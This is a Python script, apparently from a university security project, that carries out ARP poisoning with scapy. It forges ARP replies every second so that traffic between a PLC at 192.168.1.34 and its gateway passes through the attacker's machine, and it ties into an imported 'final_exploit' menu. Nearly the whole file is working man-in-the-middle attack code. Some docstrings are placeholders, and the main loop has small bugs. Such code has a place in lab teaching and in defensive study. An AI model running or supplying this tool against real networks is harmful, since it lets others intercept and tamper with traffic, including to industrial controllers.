#!/usr/bin/env python3
"""
file:       arp_spoof.py
author:     Chris Tremblay <cst1465@rit.edu>
languate:   Python3
date:       2/13/2023, National Clean Out Your Computer Day
description:
    a suite to arp poison a switch to redirect traffic to this host
    check https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
    for code
"""

import scapy.all as scapy
import time
import color_prefixes as cp
import signal
import traceback
import final_exploit as fe

# constants
PLC     = "192.168.1.34"
GATEWAY = "192.168.1.1"
VERBOSE = False

def get_mac( ip: str ) -> str:
    """
    description:
        get the MAC address for a given ip
    parameter:
        ip -> the ip address we want to get the mac address of
    return:
        the MAC address in string format, None otherwise
    """
    # create arp request with dst ip
    arp_req = scapy.ARP( pdst=ip )
    bcast = scapy.Ether( dst="ff:ff:ff:ff:ff:ff" )
    arp_req_bcast = bcast / arp_req
    answer = scapy.srp( arp_req_bcast, timeout=5, verbose=VERBOSE )[0]
    try:
        return answer[0][1].hwsrc 
    except IndexError: 
        return None

def spoof( target_ip: str, spoof_ip: str ):
    """
    description:
        craft an arp packet and send it to spoof the 
    parameters:
        target_ip -> the 
    """
    dst = get_mac(target_ip)
    if( dst is None ):
        print( cp.RED_PREFIX + "Dest MAC doesn't exist" + cp.RED_SUFFIX )
    packet = scapy.ARP( op=2, \
                        pdst=target_ip, hwdst=dst, \
                        psrc = spoof_ip )
    scapy.send( packet, verbose=VERBOSE )
    return

def restore( dst_ip: str, src_ip:str ):
    """
    description:
        restore back to defaults
    parameters:
        dst_ip -> the ip to go in dst field of ARP packet
        src_ip -> the ip to go in src field of ARP packet
    """
    # get mac addresses
    dst_mac = get_mac( dst_ip )
    src_mac = get_mac( src_ip )
    if( dst_mac is None ):
        print( cp.RED_PREFIX + "Dest MAC doesn't exist" + cp.RED_SUFFIX )
        return
    if( src_mac is None ):
        print( cp.RED_PREFIX + "Src MAC doesn't exist" + cp.RED_SUFFIX )
        return
    # craft packet    
    packet = scapy.ARP( op=2, \
                pdst=dst_ip, hwdst=dst_mac, \
                psrc=src_ip, hwsrc=src_mac )
    
    # send
    scapy.send( packet, verbose=VERBOSE )

def sig_term_hanler( sig, frame ):
    """
    description:
        SIG_TERM hanlder
    parameters:
        sig -> the signal to be processed
        frame -> the current stack frame
    """
    if( sig == signal.SIGTERM ):
        for f in traceback.walk_stack( frame ):
            name = f[0].f_code.co_name 
            local_vars = f[0].f_locals
            if( name == 'arp_poison'):
                restore( local_vars['target_ip'], local_vars['spoof_ip'] )
                restore( local_vars['spoof_ip'], local_vars['target_ip'] )
                break
        fe.PROCESS_DICT[fe.MENU_STR_ARP_POISON].kill()
    return

def arp_poison( target_ip: str, spoof_ip: str ):
    """
    description:
        arp poison a target
    parameters:
        asdf
        asdf
    """
    signal.signal( signal.SIGTERM, sig_term_hanler )
    # start spoofing
    while( True ):
        try:
            spoof( target_ip, spoof_ip )
            spoof( spoof_ip, target_ip )
            time.sleep( 1 )
        except Exception as e:
            traceback.print_exc()
            print( cp.RED_PREFIX + "error" + str(e) + cp.RED_SUFFIX )
    return

def main():
    """
    description:
        the driver function
    """
    # start spoofing
    while( True ):
        try:
            spoof( PLC, GATEWAY )
            spoof( GATEWAY, PLC )
            time.sleep( 1 )
        except KeyboardInterrupt:
            print( "done" )
            restore( PLC, GATEWAY )
            restore( GATEWAY, PLC )
    return

if( __name__ == "__main__" ):
    main()
